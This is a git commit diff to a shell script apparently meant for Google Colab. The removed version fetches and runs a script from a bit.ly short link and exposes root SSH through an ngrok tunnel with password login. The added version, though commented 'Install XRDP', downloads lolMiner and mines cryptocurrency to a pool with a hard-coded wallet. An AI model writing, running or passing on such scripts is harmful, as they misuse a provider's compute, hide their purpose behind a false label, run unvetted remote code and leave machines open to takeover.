fdf29de531c6751cbdeb9c664699f81fe51a0e1d
getxmrig <114061284+getxmrig@users.noreply.github.com>
2022-09-23 13:47:46 +0330

    Update ssh-ngrokok.sh

--- ssh-ngrokok.sh
+++ ssh-ngrokok.sh
@@ -1,33 +1,13 @@
-rm -rf ngrok ngrok.zip ngrok.sh > /dev/null 2>&1
-wget -O ng.sh https://bit.ly/GCngr0k > /dev/null 2>&1
-chmod +x ng.sh
-./ng.sh
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
 clear
-echo "======================="
-echo choose ngrok region
-echo "======================="
-echo "us - United States (Ohio)"
-echo "eu - Europe (Frankfurt)"
-echo "ap - Asia/Pacific (Singapore)"
-echo "au - Australia (Sydney)"
-echo "sa - South America (Sao Paulo)"
-echo "jp - Japan (Tokyo)"
-echo "in - India (Mumbai)"
-read -p "choose ngrok region: " CRP
-./ngrok tcp --region $CRP 22 &>/dev/null &
-echo "======================="
-echo Updating Please Wait
-echo "======================="
-sudo apt update > /dev/null 2>&1
-sudo apt install openssh-server > /dev/null 2>&1
-mkdir -p /var/run/sshd
-echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
-echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc
-echo "export LD_LIBRARY_PATH" >> /root/.bashrc
-sudo service ssh start
-echo "===================================="
-curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
-echo create root password
-passwd
-echo "===================================="
+sudo apt install screen
+screen -R lolMiner
+ 
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.57/lolminer-1.57.SwitchHiveOS.tar.gz
+tar xvzf lolminer-1.57.SwitchHiveOS.tar.gz
+cd lolminer
+./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash-eu.unmineable.com:3333 --user ERG:9iK7SExu5uqnfeXozX4zR9PvYrip3LYtpUvceqREfGXX4epYNHT.unmineable_worker_qfituw  
